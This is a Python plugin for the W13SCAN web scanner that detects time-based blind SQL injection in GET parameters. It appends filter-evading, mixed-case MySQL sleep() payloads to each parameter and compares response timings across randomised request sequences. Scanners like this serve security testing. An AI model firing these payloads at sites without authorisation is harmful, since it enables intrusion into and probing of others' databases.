#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/6/30 4:44 PM
# @Author  : w8ay
# @File    : sql_inject_time.py
import copy
import os
import random
import re
from urllib.parse import urlencode

import requests

from W13SCAN.lib.common import random_str
from W13SCAN.lib.const import acceptedExt, ignoreParams, Level
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase


class W13SCAN(PluginBase):
    name = '基于时间的SQL注入'
    desc = '''目前仅支持GET方式的请求'''
    level = Level.HIGHT

    def __init__(self):
        super().__init__()
        self.method = None
        self.headers = None
        self.url = None

        self.resp_data = None
        self.resp_str = None
        self.resp_headers = None

        self.p = None
        self.params = None
        self.netloc = None

        self.longDuration = 0
        self.shortDuration = 0

        self.max = 0
        self.min = 0

        self.time1 = 0
        self.time2 = 0
        self.time3 = 0
        self.time4 = 0
        self.timeOutCounter = 0
        self.zeroTimeOut = 0

    def init(self, flag, k, data):
        # 判断是否是内网IP，内网IP可以将延时调高,判断该url是否合适使用sql 时间盲注

        self.time1 = 0
        self.time2 = 0
        self.time3 = 0
        self.time4 = 0
        self.timeOutCounter = 0
        self.zeroTimeOut = 0

        # send a invalid value(-1)
        newValue = random_str(8)
        data[k] = newValue
        r3 = requests.get(self.netloc, params=data, headers=self.headers)
        time3 = r3.elapsed.total_seconds()

        _min = min(self.min, time3)
        _max = max(self.max, time3)
        if (_max - _min) > self.shortDuration:
            return False

        if self.shortDuration > 5:
            return False
        return True

    def genSleepString(self, sleepType):
        if self.longDuration >= 5:
            self.longDuration = 5
        if sleepType == "long":
            return self.longDuration
        elif sleepType == "verylong":
            return self.shortDuration + self.longDuration
        elif sleepType == "mid":
            return self.shortDuration
        elif sleepType == "2xmid":
            return self.shortDuration * 2 + 1
        elif sleepType == "none":
            return 0

    def testTiming(self, flag, k, data):

        self.zeroTimeOut = self.shortDuration - 1
        if self.zeroTimeOut > 3:
            self.zeroTimeOut = 3

        permutations = ["lzvm", "lzmv", "lvzm", "lvmz", "lmzv", "lmvz", "vzlm", "vzml", "vlzm", "vlmz", "vmzl", "vmlz",
                        "mzlv", "mzvl", "mlzv", "mlvz", "mvzl", "mvlz"]
        permutation = permutations[random.randint(0, len(permutations) - 1)] + "zzzlz"

        err = 0
        for i in range(len(permutation)):
            perm = permutation[i]
            data1 = copy.deepcopy(data)
            if perm == 'z':
                if not self.stepZeroDelay(flag, k, data1):
                    err += 1
            elif perm == 'l':
                if not self.stepLongDelay(flag, k, data1):
                    err += 1
            elif perm == 'v':
                if not self.stepVeryLongDelay(flag, k, data1):
                    err += 1
            elif perm == 'm':
                if not self.stepMidDelay(flag, k, data1):
                    err += 1
            if i < 5 and err > 1:
                return False
        if err > 2:
            return False
        retry = 0
        while 1:
            if retry > 2:
                return False

            if any([self.time3 > self.time4, self.time3 >= self.time1, self.time2 > self.time4, self.time2 > self.time1,
                    self.time1 >= self.time4]):
                data1 = copy.deepcopy(data)
                data2 = copy.deepcopy(data)
                if self.time3 > self.time4:
                    self.stepVeryLongDelay(flag, k, data1)
                    self.stepMidDelay(flag, k, data2)
                elif self.time3 >= self.time1:
                    self.stepLongDelay(flag, k, data1)
                    self.stepMidDelay(flag, k, data2)
                elif self.time2 > self.time4:
                    self.stepZeroDelay(flag, k, data1)
                    self.stepVeryLongDelay(flag, k, data2)
                elif self.time2 > self.time1:
                    self.stepZeroDelay(flag, k, data1)
                    self.stepLongDelay(flag, k, data2)
                elif self.time1 >= self.time4:
                    self.stepLongDelay(flag, k, data1)
                    self.stepVeryLongDelay(flag, k, data2)
                retry += 1
                continue
            break
        if self.timeOutCounter > 0:
            return False
        out.success(self.url, self.name, payload="{}:{}".format(k, flag.format(time=2)))
        return True

    def stepZeroDelay(self, flag, k, data):
        payload = self.genSleepString("none")
        data[k] = data[k] + flag.format(time=payload)
        r = requests.get(self.netloc, params=urlencode(data, safe='/+'), headers=self.headers, timeout=30)
        self.time2 = r.elapsed.total_seconds()

        if self.time2 > self.zeroTimeOut:
            return False
        return True

    def stepLongDelay(self, flag, k, data):
        payload = self.genSleepString("long")
        data[k] = data[k] + flag.format(time=payload)
        r = requests.get(self.netloc, params=urlencode(data, safe='/+'), headers=self.headers, timeout=30)
        self.time1 = r.elapsed.total_seconds()

        if self.time1 < self.longDuration * 0.99:
            return False
        return True

    def stepVeryLongDelay(self, flag, k, data):
        veryLongDuration = self.shortDuration + self.longDuration
        payload = self.genSleepString("verylong")

        data[k] = data[k] + flag.format(time=payload)
        r = requests.get(self.netloc, params=urlencode(data, safe='/+'), headers=self.headers, timeout=30)
        self.time4 = r.elapsed.total_seconds()

        if self.time4 < veryLongDuration * 0.99:
            return False
        return True

    def stepMidDelay(self, flag, k, data):
        payload = self.genSleepString("mid")
        data[k] = data[k] + flag.format(time=payload)
        r = requests.get(self.netloc, params=urlencode(data, safe='/+'), headers=self.headers, timeout=30)
        self.time3 = r.elapsed.total_seconds()

        if self.time3 < self.shortDuration * 0.99:
            return False
        return True

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        self.headers = self.requests.get_headers()  # 请求头 dict类型
        self.url = self.build_url()  # 请求完整URL

        self.resp_data = self.response.get_body_data()  # 返回数据 byte类型
        self.resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        self.resp_headers = self.response.get_headers()  # 返回头 dict类型

        self.p = p = self.requests.urlparse
        self.params = params = self.requests.params
        self.netloc = self.requests.netloc

        if method == 'GET':
            if p.query == '':
                return
            exi = os.path.splitext(p.path)[1]
            if exi not in acceptedExt:
                return

            sql_flag = [
                '/**/aNd(sEleCt+slEEp({time})uNiOn+sElect+1)',
                "'aNd(sEleCt+slEEp({time})uNiOn/**/sElect+1)='",
                '"aNd(sEleCt+slEEp({time})uNiOn/**/sElect+1)="',
            ]

            internal_ip = False
            if re.search('^(10\.|127\.|172\.16\.|192\.168\.)', self.url):
                internal_ip = True
            if internal_ip:
                self.longDuration = 6
                self.shortDuration = 2
            else:
                self.longDuration = 3
                self.shortDuration = 1

            r1 = requests.get(self.url, headers=self.headers)
            time1 = r1.elapsed.total_seconds()

            r2 = requests.get(self.url, headers=self.headers)
            time2 = r2.elapsed.total_seconds()

            _min = min(time1, time2)
            _max = max(time1, time2)

            self.shortDuration = max(self.shortDuration, _max) + 1
            self.longDuration = self.shortDuration * 2

            if (_max - _min) > self.shortDuration:
                return False

            self.max = _max
            self.min = _min

            for k, v in params.items():
                if k.lower() in ignoreParams:
                    continue
                data = copy.deepcopy(params)
                for flag in sql_flag:
                    if not self.init(flag, k, copy.deepcopy(data)):
                        continue

                    self.testTiming(flag, k, copy.deepcopy(data))
